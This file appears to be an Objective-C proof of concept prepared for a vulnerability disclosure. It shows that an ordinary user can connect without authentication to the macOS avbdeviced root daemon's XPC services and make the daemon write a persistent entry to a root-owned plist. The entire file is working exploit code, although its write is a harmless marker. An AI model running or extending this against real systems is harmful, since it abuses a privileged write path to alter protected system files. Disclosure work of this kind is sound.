// avbpoc.m — uid501 unauthenticated NSXPC client for avbdeviced (macOS 27 26A5368g)
// Proves: (A) unauth connection accepted to a root daemon's mutating XPC interface,
//         (B) unauth persistent root-side write to /Library/Application Support/Apple/com.apple.avbdeviced.virtual
// Build: clang -fobjc-arc -framework Foundation avbpoc.m -o avbpoc
#import <Foundation/Foundation.h>

@protocol ADDDaemonConfigServer
- (void)getCurrentAcquireModeState:(void(^)(int64_t state))reply;
- (void)getCurrentAcquireMaxTransitTimeTuningEnabled:(void(^)(BOOL enabled))reply;
@end

@protocol AVBAudioConfigurationServer
- (void)getCustomVirtualAudioEntityList:(void(^)(NSArray *list))reply;
- (void)addCustomVirtualEntityWithUID:(NSString *)uid
                          entityModel:(NSDictionary *)model
                         onInterfaces:(NSArray *)ifaces
                           completion:(void(^)(BOOL ok, NSError *err, unsigned long long entityID))completion;
- (void)removeCustomVirtualEntityWithUID:(NSString *)uid
                              completion:(void(^)(BOOL ok, NSError *err))completion;
@end

static void log_(NSString *s){ printf("%s\n",[s UTF8String]); fflush(stdout); }

int main(int argc, char **argv){
  @autoreleasepool {
    printf("=== avbdeviced unauthenticated XPC PoC (uid=%d) ===\n", getuid());

    // ---------- STAGE A: prove unauth ACCEPT + getter reply on com.apple.avb.daemonconfig ----------
    log_(@"\n[A] Connecting to com.apple.avb.daemonconfig (ADDDaemonConfigServer) ...");
    NSXPCConnection *c1 = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.avb.daemonconfig" options:0];
    c1.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ADDDaemonConfigServer)];
    __block BOOL c1_invalidated = NO;
    c1.invalidationHandler = ^{ c1_invalidated = YES; log_(@"[A] *** connection INVALIDATED (rejected) ***"); };
    c1.interruptionHandler  = ^{ log_(@"[A] connection interrupted"); };
    [c1 resume];

    dispatch_semaphore_t s1 = dispatch_semaphore_create(0);
    __block BOOL gotReply1 = NO; __block int64_t state = -999;
    id proxy1 = [c1 remoteObjectProxyWithErrorHandler:^(NSError *e){
        log_([NSString stringWithFormat:@"[A] proxy error: %@", e]);
        dispatch_semaphore_signal(s1);
    }];
    [proxy1 getCurrentAcquireModeState:^(int64_t st){
        gotReply1 = YES; state = st;
        log_([NSString stringWithFormat:@"[A] *** REPLY received: acquireModeState = %lld ***", st]);
        dispatch_semaphore_signal(s1);
    }];
    dispatch_semaphore_wait(s1, dispatch_time(DISPATCH_TIME_NOW, 8LL*NSEC_PER_SEC));

    dispatch_semaphore_t s1b = dispatch_semaphore_create(0);
    [proxy1 getCurrentAcquireMaxTransitTimeTuningEnabled:^(BOOL en){
        log_([NSString stringWithFormat:@"[A] *** REPLY received: maxTransitTimeTuningEnabled = %d ***", en]);
        dispatch_semaphore_signal(s1b);
    }];
    dispatch_semaphore_wait(s1b, dispatch_time(DISPATCH_TIME_NOW, 8LL*NSEC_PER_SEC));

    if (gotReply1 && !c1_invalidated)
        log_(@"[A] RESULT: unauthenticated connection ACCEPTED and getter REPLIED (no auth gate).");
    else
        log_(@"[A] RESULT: no reply / invalidated.");

    // ---------- STAGE B: prove unauth persistent ROOT WRITE via com.apple.avb.audio.configuration ----------
    log_(@"\n[B] Connecting to com.apple.avb.audio.configuration (AVBAudioConfigurationServer) ...");
    NSXPCConnection *c2 = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.avb.audio.configuration" options:0];
    c2.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AVBAudioConfigurationServer)];
    __block BOOL c2_invalidated = NO;
    c2.invalidationHandler = ^{ c2_invalidated = YES; log_(@"[B] *** connection INVALIDATED (rejected) ***"); };
    [c2 resume];

    // getter to confirm accept here too
    dispatch_semaphore_t s2 = dispatch_semaphore_create(0);
    id proxy2g = [c2 remoteObjectProxyWithErrorHandler:^(NSError *e){
        log_([NSString stringWithFormat:@"[B] getter proxy error: %@", e]); dispatch_semaphore_signal(s2); }];
    [proxy2g getCustomVirtualAudioEntityList:^(NSArray *list){
        log_([NSString stringWithFormat:@"[B] *** REPLY: getCustomVirtualAudioEntityList count=%lu ***",(unsigned long)list.count]);
        dispatch_semaphore_signal(s2);
    }];
    dispatch_semaphore_wait(s2, dispatch_time(DISPATCH_TIME_NOW, 8LL*NSEC_PER_SEC));

    // the mutating write call
    NSString *uid = [NSString stringWithFormat:@"poc.dawgyg.%@", [[NSUUID UUID] UUIDString]];
    log_([NSString stringWithFormat:@"\n[B] Calling addCustomVirtualEntityWithUID:%@ entityModel:@{} onInterfaces:@[@\"pocfake0\"]", uid]);
    dispatch_semaphore_t s3 = dispatch_semaphore_create(0);
    id proxy2 = [c2 remoteObjectProxyWithErrorHandler:^(NSError *e){
        log_([NSString stringWithFormat:@"[B] add proxy error: %@", e]); dispatch_semaphore_signal(s3); }];
    [proxy2 addCustomVirtualEntityWithUID:uid
                              entityModel:@{}
                             onInterfaces:@[@"pocfake0"]
                               completion:^(BOOL ok, NSError *err, unsigned long long entityID){
        log_([NSString stringWithFormat:@"[B] *** add completion: ok=%d entityID=0x%llx err=%@ ***", ok, entityID, err]);
        dispatch_semaphore_signal(s3);
    }];
    dispatch_semaphore_wait(s3, dispatch_time(DISPATCH_TIME_NOW, 10LL*NSEC_PER_SEC));

    // give the async writer block time to flush the plist
    usleep(700*1000);

    // write the UID we used so cleanup step can find it
    [uid writeToFile:@"/Users/dawgyg/submission_packages/avbdeviced_20260627/last_uid.txt" atomically:YES encoding:NSUTF8StringEncoding error:nil];

    log_(@"\n[done] Inspect /Library/Application Support/Apple/com.apple.avbdeviced.virtual now.");
    return 0;
  }
}
